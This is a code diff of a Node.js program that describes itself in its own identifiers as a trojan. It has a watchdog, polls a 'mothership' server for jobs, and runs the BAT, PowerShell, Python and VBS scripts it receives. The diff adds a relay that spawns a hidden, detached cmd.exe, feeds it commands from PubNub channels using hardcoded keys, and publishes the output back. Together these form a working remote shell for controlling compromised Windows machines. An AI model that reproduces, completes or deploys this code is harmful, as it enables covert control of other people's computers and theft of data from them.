@@ -6,7 +6,7 @@
 // TEST
 // REVIEW
 // anchor
-const { execFile } = require('child_process');
+const PubNub = require('pubnub');
 const net = require('net');
 const { exec, spawn } = require('child_process');
 const path = require('path');
@@ -14,7 +14,6 @@ const fs = require('fs');
 const os = require('os');
 const crypto = require('crypto');
 const util = require('util');
-const { spawnSync } = require('child_process');
 const { fork } = require('child_process');
 
 const ISDEBUG = true;
@@ -324,7 +323,8 @@ var systemstate = {
 
     get statestr() {
         return '';
-    }
+    },
+
 };
 
 class CmdConfig {
@@ -411,7 +411,8 @@ class CmdConfig {
         pspcmon: null,
         init: startup,
         task: startup,
-        execjob: execjob
+        execjob: execjob,
+        relay: relay
     };
 
     get dynamicdelay() {
@@ -480,10 +481,12 @@ class CmdConfig {
         logmsg('finished');
     };
 
-    // used by watchdog to receive messages from child cmds (ping, cmdlist)
+    // message handler -- used by parent cmds to process incoming messages from child cmds 
+    // parent cmd will have a pointer for each child cmd, each child cmd...
+    // (e.g., watchdog relays messages from ping to cmdlist)
     // ... relay messages between ping and cmdlist
     processMessage(msg) {
-        logmsg('starting');
+        logmsg('starting -- watchdog implementation');
         
         let parentcmd = this.parentcmdconfig;
 
@@ -505,7 +508,7 @@ class CmdConfig {
         logmsg('finished');
     };
 
-    // used by watchdog to send message to child cmds (ping, cmdlist)
+    // used by parent cmds to send message to child cmds (watchdog send msg to ping, cmdlist)
     sendMessage(destcmd, src, msgpayload) {
         let childp = destcmd.childprocess;
 
@@ -542,9 +545,9 @@ class CmdConfig {
         logmsg(`forking ${systemstate.trojanfpath} cmdlineargs: `+JSON.stringify(cmdlineargs));
 
         if ( Array.isArray(cmdlineargs) && cmdlineargs.length )
-            child = fork(systemstate.trojanfpath, [this.cmdname, ...cmdlineargs]);
+            child = fork(systemstate.trojanfpath, [this.cmdname, ...cmdlineargs], { execArgv: ['--inspect-brk'] } );
         else
-            child = fork(systemstate.trojanfpath, [this.cmdname]);
+            child = fork(systemstate.trojanfpath, [this.cmdname], { execArgv: ['--inspect-brk'] } );
         
         this.#__childprocess = child;
         this.#__launchprocname = path.basename(child.spawnargs[0]);
@@ -590,6 +593,8 @@ class CmdConfig {
 
         logmsg("starting main looop");
         
+        const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
+
         if ( ! this.loopfunc ) {
             logmsg('Fatal Error: loopfunc is not a valid function');
             process.exit(1);
@@ -638,6 +643,96 @@ class CmdConfig {
     };
 };
 
+// TODO
+class PubnubRelay {
+    static PUBLISH_KEY = 'pub-c-a00eaad9-c35e-4a41-bd62-cdc619a6f2cc';
+    static SUBSCRIBE_KEY = 'sub-c-94ed1e1c-a765-4fd9-ba9e-f8ebbb47f5bd';
+
+    #__pubnubConnection = null;
+
+    #__enginename = 'UNKNOWN';
+    #__userid = 'clientid_'+systemstate.clientid;
+    #__mothership_channel = `clientid_${systemstate.clientid}_${this.enginename}_mothership`;
+    #__client_channel = `clientid_${systemstate.clientid}_${this.enginename}_client`;
+ 
+    constructor(enginename) {
+        this.#__enginename = enginename;
+        
+        // TODO: log event/msg to mothership broadcasting that client has connected
+
+        this.pubnubConnection.subscribe({
+            channels: [this.client_channel, this.mothership_channel]
+        });
+    }
+
+    get mothership_channel() {
+        return this.#__mothership_channel;
+    };
+
+    get client_channel() {
+        return this.#__client_channel;
+    };
+
+    get pubnubConnection() {
+        
+        if ( this.#__pubnubConnection )
+            return this.#__pubnubConnection;
+
+        let pubnubc = new PubNub({
+            publishKey: PubnubRelay.PUBLISH_KEY,
+            subscribeKey: PubnubRelay.SUBSCRIBE_KEY,
+            userId: this.userid
+        });
+
+        this.#__pubnubConnection = pubnubc;
+
+        const channel = pubnubc.channel(this.mothership_channel);
+        const subscription = channel.subscription();
+        
+        subscription.onMessage = (messageEvent) => {
+            logmsg("Message event: " + JSON.stringify(messageEvent));
+            this.handleMessage(messageEvent);
+        };
+        
+        subscription.subscribe();
+                  
+        return this.#__pubnubConnection;
+    };
+
+    get userid() {
+        return this.#__userid;
+    };
+
+    get enginename() {
+        return this.#__enginename;
+    };
+
+    // override
+    handleMessage(msgEvent) {
+        logmsg('pass');
+    };
+
+    publishMessage(payload) {
+        logmsg('starting');
+        
+        this.pubnubConnection.publish({
+            channel: this.client_channel,
+            message: payload
+        })
+        .then((response) => {
+            logmsg('Message sent successfully! Timetoken:', response.timetoken);
+        })
+        .catch((error) => {
+            logmsg('Publish failed:', error);
+        });
+     
+        logmsg('finished');
+    }
+    
+};
+
+// ---
+
 function isChildHealthy(childProcess) {
     return (
       childProcess !== null &&
@@ -645,7 +740,7 @@ function isChildHealthy(childProcess) {
       childProcess.killed === false &&      // Has not been sent a kill signal
       childProcess.connected === true       // IPC channel is open and ready
     );
-  }
+}
   
 function ensureSingleInstancePipe(loopfunc) {
     const PIPE_NAME = '\\\\.\\pipe\\' + systemstate.lockfname;
@@ -738,32 +833,12 @@ function getProcess(pid) {
     return null;
 }
 
-function loopWithTimeout() {
-    console.log("Running task...");
-    
-    // Schedule next execution 3 seconds after this one finishes
-    setTimeout(() => {
-        loopWithTimeout();
-    }, 3000);
-}
-
 function setcwd(localpath) {
     logmsg(`Starting directory: ${process.cwd()}`);
 
     process.chdir(localpath);
 
     logmsg(`New directory: ${process.cwd()}`);
-}
-
-function createFolder(folderpath) {
-    fs.mkdirSync(folderpath, { recursive: true });
-}
-
-function getConfig() {
-    // download config from mothership
-    // save to temp file
-    // parse it and read it into obj
-    // update existing config
 }
 
 function getRandomCode(n) {
@@ -957,6 +1032,8 @@ function fileExists(filePath) {
 
 function readTag(fpath) {
 
+    logmsg('reading '+fpath);
+
     if ( ! fileExists(fpath) ) {
         throw new Error("file does not exist ["+fpath+"]");
     }
@@ -990,15 +1067,40 @@ function isPidAlive(pid) {
       return error.code === 'EPERM'; // True if it exists but you lack permissions
     }
 }
-  
-// --- main loop
-
-const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
 
 function isAsyncFunction(fn) {
     return fn?.constructor?.name === 'AsyncFunction';
 }
-  
+ 
+function extractText(rawtext, begintoken, endtoken) {
+    let token_start = rawtext.indexOf(begintoken);
+    let token_end = rawtext.indexOf(endtoken);
+    let cmdstr = '';
+
+    if ( ( token_start >= 0 ) && ( token_end > token_start ) ) {
+        cmdstr = rawtext.substring(token_start + begintoken.length, token_end);
+    }
+
+    return cmdstr;
+}
+
+function keyExists(obj, prop) {
+    return Object.keys(obj).some(
+      key => key.toLowerCase() === prop.toLowerCase()
+    );
+}
+
+function getKey(obj, searchKey) {
+    
+    let keyret = Object.keys(obj).find(
+        key => key.toLowerCase() === searchKey.toLowerCase()
+    );
+
+    return keyret;
+}
+
+ 
+
 // --- startup
 
 logmsg(`starting -- cmdname=${systemstate.cmdname} ts=${systemstate.scriptts} pid=${systemstate.scriptpid} ppid=${systemstate.scriptparentpid}`);
@@ -1010,13 +1112,12 @@ ensureSingleInstancePipe(systemstate.cmdconfig.cmdfunc);
 
 // --- IPC for current running process: message send/receive
 
-// overriden by child cmds (ping, cmdlist)
+// message handler -- overriden by child cmds (ping, cmdlist)
 var handleMessage = function(msg) {
-    throw new Error('FATAL ERROR -- function must be overriden');
+    logmsg('pass');
 }
 
-// receives messages from parent process -- should be used by cmdlist, ping
-
+// receives messages from parent process -- should be used by cmdlist, ping, relay
 process.on('message', (message) => {
     if ( ! message ) {
         throw new Error('null message');
@@ -1032,8 +1133,7 @@ process.on('message', (message) => {
 
 });
 
-// sends message to parent process -- should be called by cmdlist, ping
-
+// sends message to parent process -- should be called by cmdlist, ping, relay
 async function sendMessage(dest, msgpayload) {
     let isvalid = (typeof process.send === 'function' && process.connected );
     const parentPid = process.ppid;
@@ -1098,6 +1198,7 @@ function watchdog() {
     logmsg('starting');
 
     let watchdogcmd = systemstate.cmdconfig;
+
     watchdogcmd.newCmdConfig('ping');
     watchdogcmd.newCmdConfig('cmdlist');
 
@@ -1148,18 +1249,6 @@ function validatePingResponse(pingresponse) {
     return false;
 }
 
-function extractText(rawtext, begintoken, endtoken) {
-    let token_start = rawtext.indexOf(begintoken);
-    let token_end = rawtext.indexOf(endtoken);
-    let cmdstr = '';
-
-    if ( ( token_start >= 0 ) && ( token_end > token_start ) ) {
-        cmdstr = rawtext.substring(token_start + begintoken.length, token_end);
-    }
-
-    return cmdstr;
-}
-
 function processClientJob(rawtext) {
     let clientjob = null;
 
@@ -1191,6 +1280,8 @@ function processClientJob(rawtext) {
             };
 
             return clientjob;
+        } else {
+            throw new Error('client job request is malformed');
         }
     }
 
@@ -1223,10 +1314,6 @@ function processClientJob(rawtext) {
     return null;
 }
 
-function ping_handleMessage(message) {
-
-}
-
 async function ping_loop() {
     let baseUrl = systemstate.mothership + '/ow/ping.php';
 
@@ -1254,6 +1341,10 @@ async function ping_loop() {
 
 }
 
+function ping_handleMessage(msg) {
+    logmsg('pass');
+}
+
 function ping() {
     logmsg('starting');
 
@@ -1279,7 +1370,6 @@ function execJSScript() {
 
 }
 
-// TODO needs path to python exe
 function execPYScript(scriptfpath, cmdlineargsarr) {
     logmsg('starting');
 
@@ -1357,6 +1447,137 @@ function execCMDScript(scriptfpath, cmdlineargsarr) {
     return child;
 }
 
+function writeToChildProcess(child, msg) {
+    
+    if ( ! child ) {
+        throw new Error('child process is null');
+    }
+
+    if ( child.stdin.writable ) {
+        logmsg(`writing msg to child process: ${child.pid} -- ` + msg);
+        child.stdin.write(msg);
+        // child.stdin.end(); 
+    }
+
+}
+
+function runbatrelay(pubnubo) {
+    logmsg('starting');
+
+    const child = spawn('cmd.exe', [], { 
+        detached: true,
+        windowsHide: true,
+        stdio: [ 'pipe', 'pipe', 'pipe' ],
+        shell: false,
+        cwd: systemstate.trojandir 
+    });
+
+    // child.unref();
+
+    let tchildproc = getProcess(child.pid);
+    // CommandLine
+    // Name
+    // ProcessId
+
+    child.stdout.on('data', (data) => {
+        logmsg(`Output: ${data}`);
+        pubnubo.publishMessage( { scriptengine:'BAT', execresult:data } );
+    });
+
+    child.stdout.on('error', (err) => {
+        logmsg('STDOUT error:', err);
+    });
+
+    child.stderr.on('data', (data) => {
+        logmsg(`Output: ${data}`);
+        // TODO log to pubnub
+    });
+
+    child.stdin.on('error', (err) => {
+        if (err.code === 'EPIPE') {
+            logmsg('Subprocess closed stdin early; ignoring broken pipe.');
+        } else {
+            logmsg('Unexpected STDIN error:', err);
+        }
+    });
+
+    child.on('close', (code) => {
+        logmsg(`cmd.exe exited with code ${code}`);
+        // TODO log to pubnub
+    });
+
+    child.on('error', (err) => {
+        logmsg('Failed to start subprocess:', err);
+    });
+
+    logmsg(`launched child pid=${child.pid} spawn args: ` + JSON.stringify(child.spawnargs) + ' tchildproc: ' + JSON.stringify(tchildproc));
+
+    // log event to mothership
+    // TODO log to pubnub
+    
+    logmsg('finished');
+
+    return child;
+}
+
+function relay() {
+    logmsg('starting');
+    
+    let relaycmd = systemstate.cmdconfig;
+
+    let configfpath = '';
+
+    configfpath = process.argv.length >= 4 ? process.argv[3] : '';
+    
+    logmsg('reading configfpath: '+configfpath);
+
+    if ( ! fileExists(configfpath) ) {
+        throw new Error('configfpath does not exist '+configfpath);
+    }
+
+    let jsonconfigstr = readTag(configfpath);
+
+    if ( isNullOrWhitespace(jsonconfigstr) ) {
+        throw new Error('jsonconfigstr is empty');
+    }
+
+    logmsg('jsonconfigstr='+jsonconfigstr);
+
+    let clientjob = JSON.parse(jsonconfigstr);
+
+    logmsg('clientjob: '+JSON.stringify(clientjob));
+
+    // EXEC_CMD --> StartRelay|BAT,PS1,PY,JS,VBS
+
+    // verify that the clientjob is for relay
+    // scriptengine 'vbs', 'ps1', 'py', 'js', 'bat'
+
+    // invoke startbatrelay(), startvbsrelay, startps1relay, startpythonrelay, startnoserelay
+
+    // RODO revise implementation to allow for all script engines in addition to BAT
+
+    let childp = runbatrelay();
+
+    let pubnubr = new PubnubRelay('BAT'); // get engine name from clientjob
+    
+    // incoming cmd str from mothership
+    pubnubr.handleMessage = (msgevent) => {
+        // TODO: extract cmdstr from msgevent
+        let cmdstr = 'echo test 1234';
+        cmdstr += ' \n';
+        writeToChildProcess(childp, cmdstr);
+    };
+
+    relaycmd.loopfunc = () => {
+        logmsg("relay looping...");
+        // TODO: check if child script engine is running, if not then activate it
+    };
+
+    relaycmd.loop();
+
+    logmsg('finished');
+}
+
 function execjob() {
     logmsg('starting');
 
@@ -1392,21 +1613,6 @@ function execjob() {
     logmsg('finished');
 }
 
-function keyExists(obj, prop) {
-    return Object.keys(obj).some(
-      key => key.toLowerCase() === prop.toLowerCase()
-    );
-}
-
-function getKey(obj, searchKey) {
-    
-    let keyret = Object.keys(obj).find(
-        key => key.toLowerCase() === searchKey.toLowerCase()
-    );
-
-    return keyret;
-}
-  
 async function retrieveClientJob() {
     logmsg('starting');
 
@@ -1461,9 +1667,11 @@ async function retrieveClientJob() {
     return clientjob;
 }
 
-
+// handler for incomming messages from parent cmd (e.g., from ping to cmdlist -- watchdog acting as relay)
 async function cmdlist_handleMessage(msg) {
     logmsg('starting');
+
+    let cmdlistcmd = systemstate.cmdconfig;
 
     let clientjob = msg?.payload ?? null;
 
@@ -1488,7 +1696,34 @@ async function cmdlist_handleMessage(msg) {
         throw new Error('clientjobconfigpath does note exist ' + configfpath);
     }
 
-    let cmdlistcmd = systemstate.cmdconfig;
+    if ( jobtype.toUpperCase() == 'EXEC_CMD' ) {
+        let cmdname = clientjob.cmdname;
+        let cmdargs = clientjob.args ?? [];
+
+        if ( ( cmdname.toLowerCase() == 'StartRelay'.toLowerCase() ) && ( cmdargs.length >= 1 ) ) {
+            let relaycmd = cmdlistcmd.newCmdConfig('relay');
+
+            if ( ! relaycmd ) {
+                throw new Error('could not create child relay cmd');
+            }
+
+            let ret = relaycmd.launch([configfpath]);
+        
+            relaycmd.childprocess.unref();        
+        } else if ( ( cmdname.toLowerCase() == 'StopRelay'.toLowerCase() ) && ( cmdargs.length >= 1 ) ) {
+            let relaycmd = cmdlistcmd.getChildCmd('relay');
+            
+            relaycmd.processMessage = (msg) => {
+                logmsg('process incomming notification msgs from relay'); // TODO
+            };
+
+            cmdlistcmd.sendMessage(relaycmd, 'cmdlist', clientjob);
+        }
+        
+        // TODO: pcmon, pspcmon, GetSystemOverview, cleanup
+
+        return;
+    }
 
     let execjobcmd = cmdlistcmd.newCmdConfig('execjob');
 
@@ -1498,7 +1733,7 @@ async function cmdlist_handleMessage(msg) {
 
     let ret = execjobcmd.launch([configfpath]);
 
-    execjobcmd.childprocess.unref(); // anchor
+    execjobcmd.childprocess.unref();
      
     logmsg('finished');
 }
@@ -1515,7 +1750,7 @@ function cmdlist() {
     handleMessage = cmdlist_handleMessage;
 
     cmdlistcmd.loopfunc = () => {
-        logmsg("cmdlist doing some work...");
+        logmsg("cmdlist looping...");
     };
 
     cmdlistcmd.loop();
@@ -1590,9 +1825,7 @@ function logEventMothership(event_code, kvp) {
 
 // ---
 
-
 /*
-
     let clientjob = {
         jobtype: 'EXEC_<ext>', 'execute_cmdlist', 'EXEC_CMD'
         jobcode: 8 digit 0-9 random code,
@@ -1602,4 +1835,6 @@ function logEventMothership(event_code, kvp) {
         args: [ ... ]
     };
 
+    ping.php
+    EXEC_CMD --> StartRelay|BAT,PS1,PY,JS,VBS
 */
